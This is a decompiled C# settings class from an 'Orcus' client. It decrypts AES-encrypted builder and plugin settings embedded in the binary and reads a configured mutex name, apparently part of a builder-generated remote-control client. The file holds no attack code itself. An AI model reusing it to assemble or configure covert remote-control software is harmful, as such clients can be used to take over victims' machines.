using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Xml.Serialization;
using Orcus.Shared.Client;
using Orcus.Shared.Core;
using Orcus.Shared.Encryption;
using Orcus.Shared.Settings;

namespace Orcus.Config;

public static class Settings
{
	private static readonly List<IBuilderProperty> _settings;

	private static string _mutex;

	public static ClientConfig ClientConfig { get; }

	public static string Mutex => _mutex ?? (_mutex = Settings.GetBuilderProperty<MutexBuilderProperty>().get_Mutex());

	static Settings()
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		_settings = new List<IBuilderProperty>();
		string decryptedSettings = GetDecryptedSettings();
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(ClientConfig), BuilderPropertyHelper.GetAllBuilderPropertyTypes());
		using StringReader textReader = new StringReader(decryptedSettings);
		ClientConfig = (ClientConfig)xmlSerializer.Deserialize(textReader);
	}

	public static T GetBuilderProperty<T>() where T : IBuilderProperty, new()
	{
		T val = _settings.OfType<T>().FirstOrDefault();
		if (val != null)
		{
			return val;
		}
		T builderProperty = BuilderPropertyHelper.GetBuilderProperty<T>(ClientConfig.get_Settings());
		_settings.Add((IBuilderProperty)(object)builderProperty);
		return builderProperty;
	}

	public static List<PluginSetting> GetPluginSettings(List<Type> requiredTypes)
	{
		string s = AES.Decrypt(SettingsData.PLUGINSETTINGS, SettingsData.SIGNATURE);
		List<Type> list = new List<Type>(BuilderPropertyHelper.GetAllBuilderPropertyTypes());
		list.AddRange(requiredTypes);
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(List<ClientSetting>), list.ToArray());
		using StringReader textReader = new StringReader(s);
		return (List<PluginSetting>)xmlSerializer.Deserialize(textReader);
	}

	public static string GetDecryptedSettings()
	{
		return AES.Decrypt(SettingsData.SETTINGS, SettingsData.SIGNATURE);
	}
}
